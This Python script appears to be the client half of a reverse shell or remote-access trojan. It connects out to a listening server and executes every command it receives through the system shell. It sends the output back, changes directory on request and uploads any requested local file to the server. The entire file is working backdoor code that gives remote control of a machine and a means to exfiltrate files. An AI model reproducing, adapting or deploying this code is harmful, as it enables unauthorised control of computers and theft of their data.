import logging
import os
import socket
import subprocess
import sys

FORMAT = 'utf-8'

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)


# Handle the received commands from the server and send result
def handle_command(server):
    connected = True
    while connected:
        try:
            command = server.recv(1024).decode(FORMAT)
            logging.info(f"Received a command. Command: {command}")
            if command.startswith("cd "):
                change_dir(server, command)
            elif command[:8] == 'download':
                download(server, command)
            elif command:
                run_command(server, command)
            else:
                cwd = os.getcwd().encode(FORMAT)
                server.send(cwd)
        except:
            disconnect(server)


def disconnect(server):
    server.close()
    sys.exit()


# Checking for if wrong input is given
def wrong_input_checker(server, command):
    try:
        p = subprocess.run(command, shell=True, capture_output=True)
        err = p.stderr
        if err:
            return True
        else:
            return False
    except:
        disconnect(server)


def run_command(server, command):
    p = subprocess.run(command, shell=True, capture_output=True)
    data = p.stdout + p.stderr
    cwd = os.getcwd().encode(FORMAT)
    server.send(data + cwd)


# Changing directory
def change_dir(server, command):
    wrong_input = wrong_input_checker(server, command)
    if not wrong_input:
        os.chdir(command[3:])
        cwd = os.getcwd().encode(FORMAT)
        server.send(cwd)
    else:
        cwd = os.getcwd().encode(FORMAT)
        server.send(cwd)


def download(server, command):
    path = os.getcwd() + '\\' + command[9:]
    print(path)
    with open(path, 'rb') as file:
        file_to_transfer = file.read()
        server.send(file_to_transfer)


# Establishing the connection with the server
def connect_to_server(server_IP: str, port: int):
    logging.info("Connecting to server")
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((server_IP, port))
        return server
    except:
        logging.error("Failed to connect, try again...")


def main():
    server = connect_to_server(server_IP='127.0.0.1', port=8989)
    handle_command(server)


if __name__ == '__main__':
    main()
